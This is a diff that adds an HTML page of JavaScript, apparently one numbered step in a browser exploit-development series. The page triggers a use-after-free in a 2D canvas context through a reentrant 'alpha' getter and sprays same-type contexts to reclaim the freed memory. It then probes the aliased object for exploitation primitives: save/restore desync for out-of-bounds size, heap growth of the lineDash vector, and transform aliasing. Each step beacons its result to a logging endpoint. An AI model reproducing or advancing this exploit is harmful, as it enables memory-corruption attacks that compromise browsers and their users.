@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P702 — alias-only primitives (no 768B forge)</title>
+<script>
+'use strict';
+/* ============================================================
+ * P702 — what can the SAME-TYPE ALIAS alone give us?
+ *
+ * Established by P700/P701:
+ *   V0 no spray              -> read DIES  (m_buffer null after free)
+ *   V1 200 same-type ctxs    -> read LIVES, lw=1337
+ *   AB(768) only (P697-P699) -> DIES before any forge
+ *   AB(6656) state buffer    -> DIES at the read (P701)
+ *
+ * => The 768B CanvasRenderingContext2D class is NOT reclaimable by
+ *    ArrayBuffer on this build. Every read goes through the live
+ *    object's m_stateStack, which only exists when a same-type
+ *    context reclaims the slot. So the alias is the ONLY reachable
+ *    object; there is no "replace the object" branch.
+ *
+ * This probe maps what the alias alone provides, in independent
+ * sections that all beacon before the next risky step:
+ *
+ *   S1  alias identity + bidirectional lineWidth (control)
+ *   S2  save/restore depth through BOTH handles: can the two views
+ *       be desynchronised (the OOB m_size trick)?
+ *   S3  lineDash Vector at State+168: round-trip through both
+ *       handles, and whether a huge dash array grows it out-of-line
+ *   S4  does a setter on one handle change what the other reads for
+ *       every numeric field (full state-wide aliasing check)
+ *   S5  getTransform (State+112) round-trip through both handles
+ *
+ * Any section that dies is equally informative: the section header
+ * beacon is emitted BEFORE its risky step.
+ * ============================================================ */
+
+function raw(tag,data){ try{var x=new XMLHttpRequest();
+  x.open('GET','/beacon.php?tag=P702-'+encodeURIComponent(tag)+
+    '&data='+encodeURIComponent(String(data||'').slice(0,300))+'&t='+Date.now(),false);
+  x.send(null);}catch(e){} }
+function hex(v){return '0x'+BigInt(v).toString(16)}
+function f64bits(v){var bb=new ArrayBuffer(8);new Float64Array(bb)[0]=v;
+  return new BigUint64Array(bb)[0]}
+
+var INNER=null, SPRAY=[], ALIAS=null, ALIASIDX=-1;
+
+function run(){ raw('BOOT','p702'); try{ s0(); }catch(e){ raw('ERR',(e.message||'').slice(0,140)); } }
+
+function s0(){
+  raw('S0-GO','');
+  var cv=document.createElement('canvas'); cv.width=1; cv.height=1;
+  var o={};
+  Object.defineProperty(o,'alpha',{get:function(){ INNER=cv.getContext('2d'); return true; }});
+  cv.getContext('bitmaprenderer', o);
+  raw('S0-UAF','inner='+(INNER?'OK':'NULL'));
+  if(!INNER) return;
+
+  for(var i=0;i<200;i++){
+    var sc=document.createElement('canvas'); sc.width=1; sc.height=1;
+    var sx=sc.getContext('2d');
+    if(sx){ sx.lineWidth=1337.0; SPRAY.push(sx); }
+  }
+  raw('S0-SPRAY','n='+SPRAY.length);
+
+  /* find the alias by writing through INNER and scanning */
+  try{ INNER.lineWidth=2468.0; }catch(e){ raw('S0-W-ERR',(e.message||'').slice(0,90)); return; }
+  for(var k=0;k<SPRAY.length;k++){
+    try{ if(SPRAY[k].lineWidth===2468.0){ ALIASIDX=k; break; } }catch(e){}
+  }
+  raw('S1-ALIAS','idx='+ALIASIDX);
+  if(ALIASIDX<0){ raw('S1-FAIL','no-alias'); return; }
+  ALIAS=SPRAY[ALIASIDX];
+  setTimeout(s2, 20);
+}
+
+/* S2 — save/restore desync between the two handles */
+function s2(){
+  raw('S2-GO','');
+  var r={};
+  try{
+    r.a0=INNER.lineWidth;  r.b0=ALIAS.lineWidth;
+    INNER.lineWidth=111.0;
+    r.b1=ALIAS.lineWidth;                       /* should be 111 */
+    INNER.save();
+    ALIAS.lineWidth=222.0;
+    r.a1=INNER.lineWidth;                       /* 222 if shared state */
+    INNER.restore();
+    r.a2=INNER.lineWidth;                       /* 111 if restore worked */
+    r.b2=ALIAS.lineWidth;
+    raw('S2-DESYNC','a0='+r.a0+'|b1='+r.b1+'|a1='+r.a1+'|a2='+r.a2+'|b2='+r.b2);
+  }catch(e){ raw('S2-ERR',(e.message||'').slice(0,120)); }
+  setTimeout(s3, 20);
+}
+
+/* S3 — lineDash Vector (State+168) through both handles */
+function s3(){
+  raw('S3-GO','');
+  try{
+    var d0=INNER.getLineDash();
+    raw('S3-LEN0','len='+d0.length);
+
+    /* small dash through the alias, read through inner */
+    ALIAS.setLineDash([11.5, 22.25, 33.125]);
+    var d1=INNER.getLineDash();
+    raw('S3-SMALL','innerLen='+d1.length+'|v0='+d1[0]+'|v1='+d1[1]+'|v2='+d1[2]);
+
+    /* HUGE dash array -> grows the Vector out-of-line (heap) */
+    var big=new Array(2000);
+    for(var i=0;i<2000;i++) big[i]=1000+i*0.5;
+    ALIAS.setLineDash(big);
+    var d2=INNER.getLineDash();
+    raw('S3-BIG','innerLen='+d2.length+'|first='+d2[0]+'|last='+d2[d2.length-1]);
+
+    /* does the other handle see the same length afterwards? */
+    var d3=ALIAS.getLineDash();
+    raw('S3-BOTH','aliasLen='+d3.length);
+  }catch(e){ raw('S3-ERR',(e.message||'').slice(0,120)); }
+  setTimeout(s4, 20);
+}
+
+/* S4 — is every numeric field state-wide aliased? */
+function s4(){
+  raw('S4-GO','');
+  var fields=[['lineWidth',333.5],['miterLimit',444.25],['globalAlpha',0.625],
+              ['shadowBlur',11.75],['shadowOffsetX',55.5],['shadowOffsetY',66.5],
+              ['lineDashOffset',77.25]];
+  var out='';
+  for(var i=0;i<fields.length;i++){
+    var n=fields[i][0], v=fields[i][1];
+    try{
+      ALIAS[n]=v;
+      var got=INNER[n];
+      out+=n+':'+(got===v?'SAME':'DIFF('+got+')')+'|';
+    }catch(e){ out+=n+':ERR|'; }
+  }
+  raw('S4-ALIASED',out);
+  setTimeout(s5, 20);
+}
+
+/* S5 — transform (State+112) through both handles */
+function s5(){
+  raw('S5-GO','');
+  try{
+    ALIAS.setTransform(1.5,0.25,0.75,2.5,100.5,200.25);
+    var t=INNER.getTransform();
+    raw('S5-TX','a='+t.a+'|b='+t.b+'|c='+t.c+'|d='+t.d+'|e='+t.e+'|f='+t.f);
+  }catch(e){ raw('S5-ERR',(e.message||'').slice(0,120)); }
+
+  /* leave the dash Vector out-of-line and big, for the next probe */
+  try{
+    var big=new Array(2000);
+    for(var i=0;i<2000;i++) big[i]=1234.5+i;
+    INNER.setLineDash(big);
+    raw('S5-DASHGROWN','len='+INNER.getLineDash().length);
+  }catch(e){ raw('S5-DASH-ERR',(e.message||'').slice(0,90)); }
+
+  raw('DONE','p702-complete');
+}
+
+if(document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
+else document.addEventListener('DOMContentLoaded',run);
+</script>
+</head><body><pre id="out">P702 — alias-only primitives</pre></body></html>
